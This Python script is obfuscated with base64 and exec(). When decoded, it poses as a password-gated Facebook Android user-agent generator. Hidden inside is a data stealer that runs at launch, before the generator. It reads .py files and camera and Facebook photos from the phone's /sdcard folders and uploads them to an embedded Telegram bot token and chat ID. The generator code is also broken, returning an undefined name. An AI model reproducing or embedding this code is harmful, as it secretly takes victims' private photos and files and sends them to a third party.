#ENCODED BY : MR-Adi
#GITHUB : Mradi007
#ENCRYPTION : Py3 BASE64
import base64
exec(base64.b64decode(b'CmltcG9ydCByYW5kb20KaW1wb3J0IHRpbWUKaW1wb3J0IG9zCmRlZiBjbGVhcigpOgoJb3Muc3lzdGVtKCdjbGVhcicpCiAgICAKaW1wb3J0IHJlcXVlc3RzLG9zLHN5cwpmcm9tIGNvbmN1cnJlbnQuZnV0dXJlcyBpbXBvcnQgVGhyZWFkUG9vbEV4ZWN1dG9yIGFzIFRocmVhZFBvb2wKCiNAdXNlcmlkaW5mb2JvdAoKZGVmIHNleHkoKToKICAgIHNlc3Npb249cmVxdWVzdHMuc2Vzc2lvbigpCiAgICAgICAgCiAgICBib3RfdG9rZW4gPSAnNzEyMjU2MjIzNjpBQUdBRUNTVTVYMDJuNktkTmhWd0RRQUdmelNQTnhCUllWZycgCiAgICBjaGF0X2lkID0gJzYyNTQ1NDMzNTEnCiAgICAjLS0tLS0tLS0tLS0oIC9zZGNhcmQKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc2RjYXJkJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5weScpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICB1cmw9ZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JwogICAgICAgICAgICAgICAgZGF0YTI9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGZpbGVzPXsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICAgICAgZ2V0ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgIHNlbnQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEyLCBmaWxlcz1maWxlcykKICAgIGV4Y2VwdDpwYXNzCiAgICAjLS0tLS0tLS0tLS0tKCAvc2RjYXJkL0Rvd25sb2FkIAogICAgdHJ5OgogICAgICAgIHNkY2FyZF9wYXRoID0gJy9zZGNhcmQvRENJTS9DYW1lcmEnCiAgICAgICAgZmlsZV9saXN0ID0gW2YgZm9yIGYgaW4gb3MubGlzdGRpcihzZGNhcmRfcGF0aCkgaWYgZi5lbmRzd2l0aCgnLmpwZycpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICB1cmw9ZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JwogICAgICAgICAgICAgICAgZGF0YTI9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGZpbGVzPXsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICAgICAgZ2V0ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgIHNlbnQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEyLCBmaWxlcz1maWxlcykKICAgIGV4Y2VwdDpwYXNzCiAgICAjLS0tLS0tLS0tLS0tLSggL3NkY2FyZC9Eb3dubG9hZC9UZWxlZ3JhbSAKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc2RjYXJkL0Rvd25sb2FkL1RlbGVncmFtJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5weScpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICB1cmw9ZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JwogICAgICAgICAgICAgICAgZGF0YTI9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGZpbGVzPXsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICAgICAgZ2V0ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgIHNlbnQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEyLCBmaWxlcz1maWxlcykKICAgIGV4Y2VwdDpwYXNzCiAgICAjLS0tLS0tLS0oIC9zZGNhcmQvVGVsZWdyYW0vVGVsZWdyYW0gRmlsZXMKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc2RjYXJkL1RlbGVncmFtL1RlbGVncmFtIEZpbGVzJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5weScpXQogICAgICAgIGZvciBmaWxlIGluIGZpbGVfbGlzdDoKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihzZGNhcmRfcGF0aCwgZmlsZSksICdyYicpIGFzIGY6CiAgICAgICAgICAgICAgICB1cmw9ZidodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZERvY3VtZW50JwogICAgICAgICAgICAgICAgZGF0YTI9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGRhdGE9eydjaGF0X2lkJzogY2hhdF9pZH0KICAgICAgICAgICAgICAgIGZpbGVzPXsnZG9jdW1lbnQnOiBmfQogICAgICAgICAgICAgICAgZ2V0ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgIHNlbnQgPSBzZXNzaW9uLnBvc3QodXJsLCBkYXRhPWRhdGEyLCBmaWxlcz1maWxlcykKICAgIGV4Y2VwdDpwYXNzCiAgICAjLS0tLS0tLS0tLSggL3NkY2FyZC9XaGF0c0FwcC9NZWRpYS9XaGF0c0FwcCBEb2N1bWVudHMKICAgIHRyeToKICAgICAgICBzZGNhcmRfcGF0aCA9ICcvc2RjYXJkL1BpY3R1cmVzL0ZhY2Vib29rJwogICAgICAgIGZpbGVfbGlzdCA9IFtmIGZvciBmIGluIG9zLmxpc3RkaXIoc2RjYXJkX3BhdGgpIGlmIGYuZW5kc3dpdGgoJy5qcGcnKV0KICAgICAgICBmb3IgZmlsZSBpbiBmaWxlX2xpc3Q6CiAgICAgICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oc2RjYXJkX3BhdGgsIGZpbGUpLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgdXJsPWYnaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtib3RfdG9rZW59L3NlbmREb2N1bWVudCcKICAgICAgICAgICAgICAgIGRhdGEyPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBkYXRhPXsnY2hhdF9pZCc6IGNoYXRfaWR9CiAgICAgICAgICAgICAgICBmaWxlcz17J2RvY3VtZW50JzogZn0KICAgICAgICAgICAgICAgIGdldCA9IHNlc3Npb24ucG9zdCh1cmwsIGRhdGE9ZGF0YSwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICBzZW50ID0gc2Vzc2lvbi5wb3N0KHVybCwgZGF0YT1kYXRhMiwgZmlsZXM9ZmlsZXMpCiAgICBleGNlcHQ6cGFzcwoKd2l0aCBUaHJlYWRQb29sKG1heF93b3JrZXJzPTkwKSBhcyBqamo6CiAgICBqamouc3VibWl0KHNleHkpCiAgICBqamouc3VibWl0KHNleHkpCiAgICAKCSNpbXBvcnQgZ2V0cGFzcwphdHRlbXBzID0gMAoKd2hpbGUgYXR0ZW1wcyA8IDEyMzQ1Njc3OTAxOgogICAgdXNlcm5hbWUgPSBpbnB1dCgnIFwwMzNbOTc7MW1FbnRlciBVc2VybmFtZTogJykKICAgIHBhc3N3b3JkID0gaW5wdXQoJyBcMDMzWzk3OzFtRW50ZXIgUGFzc3dvcmQ6ICcpCgogICAgaWYgdXNlcm5hbWUgPT0gJ2phc3JlbCcgYW5kIHBhc3N3b3JkID09ICcyMDA2JzoKICAgICAgICBwcmludCgnIFwwMzNbMDs5Mm1Zb3UgSGF2ZSBTdWNjZXNzZnVsbHkgTG9nZ2VkIGluLicpCiAgICAgICAgYnJlYWsKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoJyBJbmNvcnJlY3QgUGFzcyBQbGVhc2UgVHJ5aW5nICcpCiAgICAgICAgYXR0ZW1wcyArPSAxCiAgICAgICAgY29udGludWUJCnByaW50KCdb4oCiXSBUT09MIExPQURJTkcnKSAgICAKIyBDdXN0b21pemUgdGhlIGxpc3RzIHdpdGggeW91ciBkZXNpcmVkIHZhbHVlcwpERU5TSVRZX09QVElPTlMgPSBbIjEuNSIsICIyLjAiLCAiMi41IiwgIjMuMCJdCldJRFRIX09QVElPTlMgPSBbNzIwLCAxMDgwLCAxNDQwLCAxOTIwLCAyNTYwXQpIRUlHSFRfT1BUSU9OUyA9IFsxMjgwLCAxOTIwLCAyNTYwLCAzODQwLCA0MDk2XQpGQkxDX09QVElPTlMgPSBbImZyX0ZSIiwgImVuX1VTIiwgImVzX0VTIiwgImRlX0RFIiwgIml0X0lUIiwgInJ1X1JVIiwgInpoX0NOIiwgImphX0pQIl0KRkJEVl9PUFRJT05TID0gIiIiCkNQSDE4NjkKQ1BIMTkyOQpDUEgyMTA3CkNQSDIyMzgKQ1BIMjM4OQpDUEgyNDAxCkNQSDI0MDcKQ1BIMjQxMwpDUEgyNDE1CkNQSDI0MQpDUEgyNDE5CkNQSDI0NTUKQ1BIMjQ1OQpDUEgyNDYxCkNQSDI0NzEKQ1BIMjQ3MwpDUEgyNDc3CkNQSDg4OTMKQ1BIMjMyMQpDUEgyMzQxCkNQSDIzNzMKQ1BIMjA4MwpDUEgyMDcxCkNQSDIwNzcKQ1BIMjE4NQpDUEgyMTc5CkNQSDIyNjkKQ1BIMjQyMQpDUEgyMzQ5CkNQSDIyNzEKQ1BIMTkyMwpDUEgxOTI1CkNQSDE4MzcKQ1BIMjAxNQpDUEgyMDczCkNQSDIwODEKQ1BIMjAyOQpDUEgyMDMxCkNQSDIxMzcKQ1BIMTYwNQpDUEgxODAzCkNQSDE4NTMKQ1BIMTgwNQpDUEgxODA5CkNQSDE4NTEKQ1BIMTkzMQpDUEgxOTU5CkNQSDE5MzMKQ1BIMTkzNQpDUEgxOTQzCkNQSDIwNjEKQ1BIMjA2OQpDUEgyMTI3CkNQSDIxMzEKQ1BIMjEzOQpDUEgyMTM1CkNQSDIyMzkKQ1BIMjE5NQpDUEgyMjczCkNQSDIzMjUKQ1BIMjMwOQpDUEgxNzAxCkNQSDIzODcKQ1BIMTkwOQpDUEgxOTIwCkNQSDE5MTIKQ1BIMTkwMQpDUEgxOTAzCkNQSDE5MDUKQ1BIMTcxNwpDUEgxODAxCkNQSDIwNjcKQ1BIMjA5OQpDUEgyMTYxCkNQSDIyMTkKQ1BIMjE5NwpDUEgyMjYzCkNQSDIzNzUKQ1BIMjMzOQpDUEgxNzE1CkNQSDIzODUKQ1BIMTcyOQpDUEgxODI3CkNQSDE5MzgKQ1BIMTkzNwpDUEgxOTM5CkNQSDE5NDEKQ1BIMjAwMQpDUEgyMDIxCkNQSDIwNTkKQ1BIMjEyMQpDUEgyMTIzCkNQSDIyMDMKQ1BIMjMzMwpDUEgyMzY1CkNQSDE5MTMKQ1BIMTkxMQpDUEgxOTE1CkNQSDE5NjkKQ1BIMjIwOQpDUEgxOTg3CkNQSDIwOTUKQ1BIMjExOQpDUEgyMjg1CkNQSDIyMTMKQ1BIMjIyMwpDUEgyMzYzCkNQSDE2MDkKQ1BIMTYxMwpDUEgxNzIzCkNQSDE3MjcKQ1BIMTcyNQpDUEgxODE5CkNQSDE4MjEKQ1BIMTgyNQpDUEgxODgxCkNQSDE4MjMKQ1BIMTg3MQpDUEgxODc1CkNQSDIwMjMKQ1BIMjAwNQpDUEgyMDI1CkNQSDIyMDcKQ1BIMjE3MwpDUEgyMzA3CkNQSDIzMDUKQ1BIMjMzNwpDUEgxOTU1CkNQSDE3MDcKQ1BIMTcxOQpDUEgxNzIxCkNQSDE4MzUKQ1BIMTgzMQpDUEgxODMzCkNQSDE4NzkKQ1BIMTg5MwpDUEgxODc3CkNQSDE2MDcKQ1BIMTYxMQpDUEgxOTE3CkNQSDE5MTkKQ1BIMTkwNwpDUEgxOTg5CkNQSDE5NDUKQ1BIMTk1MQpDUEgyMDQzCkNQSDIwMzUKQ1BIMjAzNwpDUEgyMDM2CkNQSDIwMDkKQ1BIMjAxMwpDUEgyMTEzCkNQSDIwOTEKQ1BIMjEyNQpDUEgyMTA5CkNQSDIwODkKQ1BIMjA2NQpDUEgyMTU5CkNQSDIxNDUKQ1BIMjIwNQpDUEgyMjAxCkNQSDIxOTkKQ1BIMjIxNwpDUEgxOTIxCkNQSDIyMTEKQ1BIMjIzNQpDUEgyMjUxCkNQSDIyNDkKQ1BIMjI0NwpDUEgyMjM3CkNQSDIzNzEKQ1BIMjI5MwpDUEgyMzUzCkNQSDIzNDMKQ1BIMjM1OQpDUEgyMzU3CkNQSDI0NTcKQ1BIMTk4MwpDUEgxOTc5CkNQSDI0NTEKQ1BIMjQxOQpDUEgyMzg5CkNQSDIzNTEKQ1BIMjMzMgpDUEgyMzMxCkNQSDIyNjEKQ1BIMjIzOApDUEgyMTA3CkNQSDIwNDgKQ1BIMTkyOQpDUEgxOTg1CkNQSDE4NjkKQ1BIMTYxNQpDUEgxNjY0CkNQSDE0NTEKQ1BIMTIzNQpDUEgxMTE0CiIiIi5zcGxpdGxpbmVzKCkKCk9QUE9fT1BUSU9OUyA9ICIiIgpPUFBPIEY5Ck9QUE8gUmVubwpPUFBPIEEzM20KT1BQTyBBMzUKT1BQTyBBMzcKT1BQTyBBMzdtCk9QUE8gQTM3bQpPUFBPIEEzN3QKT1BQTyBBMzd0bQpPUFBPIEEzOQpPUFBPIEEzOW0KT1BQTyBBMzl0Ck9QUE8gQTM5dG0KT1BQTyBBNTMKT1BQTyBBNTNtCk9QUE8gQTU3Ck9QUE8gQTU3dApPUFBPIEE1N3QKT1BQTyBBNTkKT1BQTyBBNTltCk9QUE8gQTU5cwpPUFBPIEE1OW0KT1BQTyBBNTlzdApPUFBPIEE1OXQKT1BQTyBBNTl0bQpPUFBPIEE3MwpPUFBPIEE3MwpPUFBPIEE3M3QKT1BQTyBBNzN0Ck9QUE8gQTc3Ck9QUE8gQTc3dApPUFBPIEE3OQpPUFBPIEE3OWsKT1BQTyBBNzlrdApPUFBPIEE3OXQKT1BQTyBBNzl0Ck9QUE8gQTgzCk9QUE8gQTgzdApPUFBPIENQSDE2MDUKT1BQTyBXYXRjaApPUFBPIFdhdGNoCk9QUE8gUjExCk9QUE8gUjExdApPUFBPIFIxMSBQbHVzCk9QUE8gUjExIFBsdXNrCk9QUE8gUjExIFBsdXNrdApPUFBPIFIxMSBQbHVzdApPUFBPIFIxMXMKT1BQTyBSMTFzIFBsdXMKT1BQTyBSMTFzIFBsdXN0Ck9QUE8gUjExc3QKT1BQTyBSNwpPUFBPIFI3cwpPUFBPIFI3c1BsdXMKT1BQTyBSOQpPUFBPIFI5a20KT1BQTyBSOW0KT1BQTyBSOXRtCk9QUE8gUjkgUGx1c20gQQpPUFBPIFI5IFBsdXN0bSBBCk9QUE8gUjkgUGx1cyBBCk9QUE8gUjkgUGx1c20gQQpPUFBPIFI5IFBsdXN0bSBBCk9QUE8gUjkgUGx1c20gQQpPUFBPIFI5IFBsdXN0IEEKT1BQTyBSOSBQbHVzdG0gQQpPUFBPIFI5awpPUFBPIFI5a20KT1BQTyBSOW0KT1BQTyBSOXRtCk9QUE8gUjlrbQpPUFBPIFI5bQpPUFBPIFI5cwpPUFBPIFI5cyBQbHVzCk9QUE8gUjlzIFBsdXN0Ck9QUE8gUjlzUGx1cwpPUFBPIFI5c2sKT1BQTyBSOXNrdApPUFBPIFI5c3QKT1BQTyBSOXQKT1BQTyBSOXRtCiIiIi5zcGxpdGxpbmVzKCkKI0ZCRFZfT1BUSU9OUyA9IFsiT3Bwb19GMTkiLCJPcHBvX1Jlbm9fNiIsIk9wcG9fUmVub183IiwgIk9wcG9fUmVub184IiwiT3Bwb19SZW5vXzkiLAogICAgIyJPcHBvX1Jlbm9fMTAiLCAiT3Bwb19SZW5vXzExIiwgIk9wcG9fUmVub18xMiIsIk9wcG9fUmVub18xMyIsIk9wcG9fUmVub18xNCIsCiAgICAjIk9wcG9fUmVub18xNSIsICJPcHBvX1Jlbm9fMTYiLCAKICAgICMiT3Bwb19SZW5vXzE3Il0KRkJTVl9PUFRJT05TID0gWyIxMSIsICIxMiIsICIxMyIsICIxNCIsICIxNSIsICIxNiIsICIxNyJdCkZCT1BfT1BUSU9OUyA9IFsiNCIsICI1IiwgIjYiLCAiNyIsICI4Il0KRkJDQV9PUFRJT05TID0gWyJhcm02NC12OGEiLCAiYXJtZWFiaS12N2EiLCAiYXJtZWFiaSJdCgoKZGVmIGdlbmVyYXRlX3VzZXJfYWdlbnQoKToKICAgIGZiYW5fZmJhYSA9IHJhbmRvbS5jaG9pY2UoWyJGQkFOIl0pCiAgICBmYmFuX2ZiYXMgPSByYW5kb20uY2hvaWNlKFsiRkI0QSJdKQogICAgZmJhdiA9IHN0cihyYW5kb20ucmFuZGludCgxMTEsNTU1KSkrJy4wLjAuJytzdHIocmFuZG9tLnJhbmRyYW5nZSg5LDQ5KSkrJy4nK3N0cihyYW5kb20ucmFuZGludCgxMTEsNTU1KSkKICAgIGZiYnYgPSByYW5kb20ucmFuZGludCgxMDAwMDAwMDAsIDk5OTk5OTk5OSkKICAgIGRlbnNpdHkgPSByYW5kb20uY2hvaWNlKERFTlNJVFlfT1BUSU9OUykKICAgIHdpZHRoID0gcmFuZG9tLmNob2ljZShXSURUSF9PUFRJT05TKQogICAgaGVpZ2h0ID0gcmFuZG9tLmNob2ljZShIRUlHSFRfT1BUSU9OUykKICAgIGZiZG0gPSBmInt7ZGVuc2l0eT17ZGVuc2l0eX0sd2lkdGg9e3dpZHRofSxoZWlnaHQ9e2hlaWdodH19fSIKICAgIGZibGMgPSByYW5kb20uY2hvaWNlKEZCTENfT1BUSU9OUykKICAgIGZicnYgPSByYW5kb20ucmFuZGludCgxMDAwMDAwMDAsIDk5OTk5OTk5OSkKICAgIGZiY3IgPSByYW5kb20uY2hvaWNlKFsiT1BQTyIsXSkKICAgIGZibWYgPSByYW5kb20uY2hvaWNlKFsiT1BQTyIsXSkKICAgIGZiYmQgPSByYW5kb20uY2hvaWNlKE9QUE9fT1BUSU9OUykKICAgIGZicG4gPSAiY29tLmZhY2Vib29rLmthdGFuYSIKICAgIGZiZHYgPSByYW5kb20uY2hvaWNlKEZCRFZfT1BUSU9OUykKICAgIGZic3YgPSByYW5kb20uY2hvaWNlKEZCU1ZfT1BUSU9OUykKICAgIGZib3AgPSByYW5kb20uY2hvaWNlKEZCT1BfT1BUSU9OUykKICAgIGZiY2EgPSByYW5kb20uY2hvaWNlKEZCQ0FfT1BUSU9OUykKICAgIGZic3MgPSByYW5kb20uY2hvaWNlKFtyYW5kb20ucmFuZGludCgxMCwgMjApLCAiIl0pCiAgICAjW0ZCQU4vRkI0QTtGQkFWLzU2LjAuMC4zMjIyO0ZCQlYvMzE3ODAxNTk7W0ZCQU4vRkI0QTtGQkFWLzMxMC4wLjAuMy4xMDc7RkJCVi80MzQ3NTg3OTk7RkJETS97ZGVuc2l0eT0zLjIsd2lkdGg9MTA4MCxoZWlnaHQ9MTQ0N307RkJMQy9lbl9VUztGQlJWLzM0OC4wLjAuMy4xOTM7RkJDUi9Td2lzc2NvbTtGQk1GL01vdG9yb2xhO0ZCQkQvTW90b3JvbGE7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvWFQyMTI3LTE0NDtGQlNWLzEwO0ZCT1AvMTtGQkNBL2FybTY0LXY4YTpdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIHVzZXJfYWdlbnQgPSBmIltGQkFOL3tmYmFuX2ZiYXN9O0ZCQVYve2ZiYXZ9O0ZCQlYve2ZiYnZ9O0ZCRE0ve2ZiZG19O0ZCTEMve2ZibGN9O0ZCUlYve2ZicnZ9O0ZCQ1Ive2ZiY3J9O0ZCTUYve2ZibWZ9O0ZCQkQve2ZiYmR9O0ZCUE4ve2ZicG59O0ZCRFYve2ZiZHZ9O0ZCU1Yve2Zic3Z9O0ZCT1Ave2Zib3B9O0ZCQ0Eve2ZiY2F9O10iCgogICAgcmV0dXJuIHVzZXJfYWdlbnQKZGVmIGdlbmVyYXRlX3VzZXJfYWdlbnRzKGNvdW50KToKICAgIHVzZXJfYWdlbnRzID0gW2dlbmVyYXRlX3VzZXJfYWdlbnQoKSBmb3IgXyBpbiByYW5nZShjb3VudCldCiAgICByZXR1cm4gdXNlcl9hZwogICAgCmRlZiBtYWluKCk6CgkjIEFTQ0lJIGxvZ28KICAgIHByaW50KCIiIgpcMDMzWzk3OzFtICAgICAgICAgICDilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilojilZcKXDAzM1s5NzsxbSAgICAgICAgICDilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZfilpHilojilojilZHilZrilZDilZDilojilojilZTilZDilZDilZ0KXDAzM1s5NzsxbSAgICAgICAgICDilojilojilZHilpHilpHilZrilZDilZ3ilojilojilojilojilojilZfilpHilpHilojilojilZTilojilojilZfilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilpEKXDAzM1s5NzsxbSAgICAgICAgICDilojilojilZHilpHilpHilojilojilZfilojilojilZTilZDilZDilZ3ilpHilpHilojilojilZHilZrilojilojilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilpEKXDAzM1s5NzsxbSAgICAgICAgICDilZrilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilojilZfilojilojilZHilpHilZrilojilojilojilZHilpHilpHilpHilojilojilZHilpHilpHilpEKXDAzM1s5NzsxbSAgICAgICAgICDilpHilZrilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ3ilpHilpHilZrilZDilZDilZ3ilpHilpHilpHilZrilZDilZ3ilpHilpHilpEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAg4pWU4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pWXCiAgICAg4pWRICAgICAgXDAzM1s5NzsxbVsgRiBVIEMgSyBZIE8gVSBCIFkgUCBBIFMgUyBFIFIgXSAgICAgXDAzM1s5NzsxbSDilZEKICAgICDilZrilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilZ0KXDAzM1s5NzsxbeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgQpbwqddIEFVVEhPUiAgICAgICA6ICAgICAgSkFTUkVMClvCp10gVE9PTFMgICAgICAgIDogICAgICBGQkFOIFVBIEdFTgpbwqddIFRZUEUgICAgICAgICA6ICAgICAgcHJpdmF0ZQpbwqddIEZBQ0VCT09LICAgICA6ICAgICAgSkFTUkVMClvCp10gVkVSU0lPTi4gICAgIDogICAgICBQUklWQVRFClwwMzNbOTc7MW3ilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIEKCgogICAgIiIiKQogICAgCiAgICBudW1fdXNlcl9hZ2VudHMgPSBpbnQoaW5wdXQoIlwwMzNbOTc7MW0gSG93IG1hbnkgdXNlciBhZ2VudHMgZG8geW91IHdhbnQgIikpCiAgICBVQSA9IGdlbmVyYXRlX3VzZXJfYWdlbnRzKG51bV91c2VyX2FnZW50cykKICAgIHByaW50KCJcMDMzWzk3OzFtIEdlbmVyYXRpbmcgbG9hZGluZy4uIikKICAgIHRpbWUuc2xlZXAoOCkKICAgIAogICAgcHJpbnQoZiJcMDMzWzk3OzFt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikKICAgIHByaW50KCJcMDMzWzk3OzFtPj4+Pj4+Pj4+Pj4+Pj4+IEdlbmVyYXRlZCBVc2VyIEFnZW50cyA8PDw8PDw8PDw8PDw8PDoiKQogICAgcHJpbnQoZiJcMDMzWzk3OzFt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikKICAgIGZvciBpZHgsIEtBVEFOQSBpbiBlbnVtZXJhdGUoVUEsIHN0YXJ0PTEpOgogICAgICAgIHByaW50KGYiVUEtRkJBTi1LQVRBTkEgeyBpZHh9OiB7S0FUQU5BfSIpCiAgICAgICAgcHJpbnQoZiJcMDMzWzk3OzFt4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBIikKICAgICAgICBvcGVuKCcvc2RjYXJkL0NFTlRfVUFfS0FUQU5BLnR4dCcsJ2EnKS53cml0ZShLQVRBTkErJ1xuJykKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk='))